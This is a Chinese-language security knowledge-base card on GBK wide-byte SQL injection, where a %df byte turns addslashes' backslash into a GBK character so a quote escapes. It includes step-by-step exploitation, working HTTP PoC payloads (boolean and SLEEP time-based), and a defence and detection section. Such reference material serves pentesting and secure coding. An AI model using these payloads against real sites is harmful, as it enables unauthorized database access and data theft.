---
id: web-generic-sqli-gbk-wide-byte-escape-bypass
title: GBK 宽字节注入：%df 与转义反斜杠合成汉字，让单引号重新逃逸
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-gbk-wide-byte
tags:
- sqli
- gbk
- wide-byte
- addslashes
- escape-bypass
- php
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:15:27+08:00'
  notes: 原文无图片，已核对 GBK 宽字节原理：addslashes 在 0x27 前插入 0x5c，0xdf 0x5c 组成合法 GBK 汉字使单引号逃逸；卡中把原文误写的 31 25 64 66 5c 27 修正为 31 df 5c 27，并正确注明 mysql_real_escape_string 字符集感知的边界。原文未涉及版本区间。未执行 PoC。
url: /docs/web/generic/sqli/web-generic-sqli-gbk-wide-byte-escape-bypass/
draft: false
kb_aliases:
- 宽字节注入
- 宽字符注入
- GBK 注入
- '%df 注入'
- 0xbf%27 注入
- 宽字节绕过 addslashes
---

## 一句话结论

当数据库/连接使用 GBK 等多字节字符集，而 PHP 用 `addslashes()` 等非字符集感知的方式转义单引号时，攻击者提交 `%df'`，`addslashes` 会在单引号前补 `0x5c`，`0xdf 0x5c` 恰好被 GBK 解析成一个合法汉字，反斜杠被“吃掉”，后面的单引号重新成为 SQL 语法中的引号，注入成立。

## 原理

- `addslashes()` 的转义规则是在 `'`、`"`、`\`、NUL 前加反斜杠，它按字节处理，不关心目标数据库的字符集。
- 以 GBK 为例，GBK 的双字节字符第一个字节范围是 `0x81-0xFE`，第二个字节范围包含 `0x40-0xFE`（不含 `0x7F`）。`0x5c`（反斜杠）落在第二字节范围内。
- 攻击者提交 `%df'`，URL 解码后是字节 `0xdf 0x27`；`addslashes` 在 `0x27` 前插入 `0x5c`，得到 `0xdf 0x5c 0x27`。
- MySQL 按 GBK 解析时，先把 `0xdf 0x5c` 组合成一个合法汉字（如“運”），于是 `0x27` 不再被视为被反斜杠转义的字符，而是真正的单引号，SQL 结构被闭合。
- 常见触发条件是连接字符集为 GBK/GB2312/GB18030，且转义发生在字符集设置之前或使用了 `addslashes` 这类非字符集感知函数；`mysql_real_escape_string` 在正确设置连接字符集时是字符集感知的，但字符集设置顺序错误或使用了 `SET NAMES gbk` 仍可能落入同类问题。
- 本质是“转义函数按字节、数据库按字符集解析”的语义错位，不是 GBK 本身有漏洞。

## 触发条件

- 后端数据库或连接字符集为 GBK/GB2312/GB18030 等双字节字符集。
- 应用使用 `addslashes`、`mysql_escape_string` 或在错误的字符集设置下使用转义函数。
- 单引号等特殊字符的过滤依赖上述转义，没有使用参数化查询。
- 注入位置在字符串字面量内，且后续 SQL 结构可由闭合后的引号控制。

## 利用步骤

1. 判断字符集：观察响应头、页面 meta、错误信息，或通过 `SET NAMES` 相关报错推断；GBK 站点常见于中文老系统。
2. 提交 `id=1%df'`，观察是否出现 SQL 报错；若返回正常，继续构造布尔条件。
3. 用 `1%df' AND '1'='1` 与 `1%df' AND '1'='2` 对比响应。
4. 用 `1%df' AND SLEEP(5)-- -` 做时间盲注确认。
5. 确认后按普通 SQL 注入提取数据；若 `--` 被过滤，可用 `#` 或 `/*` 注释。
6. 若 `%df` 被过滤，尝试其他首字节（如 `%bf`、`%81`）或使用 `%bf%27` 形式，具体取决于字符集与转义结果。

## PoC

```http
GET /product.php?id=1%df%27%20AND%201=1--%20 HTTP/1.1
Host: target
```

等价的可读形式：

```text
id=1%df' AND 1=1-- 
```

字节层面：

```text
输入解码后: 31 df 27
addslashes: 31 df 5c 27
GBK 解析:   31 [df 5c] 27   -> 1 運 '
最终 SQL:   ... WHERE id = '1運' AND 1=1-- '
```

时间盲注：

```text
id=1%df' AND SLEEP(5)-- 
```

另一种常见首字节：

```text
id=1%bf%27 AND 1=1-- 
```

说明：`%bf%27` 经 `addslashes` 变为 `bf 5c 27`，`bf 5c` 同样是合法 GBK 字符；具体哪个首字节可用取决于目标字符集和数据库版本。

## 变体与关联

- 变体：GB2312、GB18030、Big5 等多字节字符集存在同类“吃掉转义字节”的组合，首字节范围不同。
- 变体：宽字节注入也可用于绕过 `mysql_real_escape_string`，前提是连接字符集与实际解析字符集不一致（如先转义后 `SET NAMES gbk`）。
- 关联：[[web-generic-sqli-http-header-injection]]（同样的注入原语放到请求头）。
- 关联：[[web-generic-sqli-exists-left-boolean-oracle]]（确认注入后的布尔提取）。
- 边界：目标使用 UTF-8/utf8mb4 且转义函数字符集感知时，`0xdf 0x5c` 不会组成合法字符，本手法失效。

## 检测与防御

- 修复：统一使用参数化查询/预编译，彻底消除字符串拼接 SQL。
- 修复：数据库与连接统一使用 `utf8mb4`；在设置连接字符集之后再执行任何转义，并使用字符集感知的转义函数（PDO 预处理或 `mysqli_real_escape_string` + `mysqli_set_charset`）。
- 加固：开启 `NO_BACKSLASH_ESCAPES` 需谨慎评估兼容性；不要依赖黑名单过滤 `%df` 等字节。
- 检测：请求参数中出现 `%df`、`%bf` 等高位字节紧跟引号的组合；SQL 错误日志中出现包含非法 GBK 字符的语句；同一参数反复出现引号与布尔/时间 Payload。
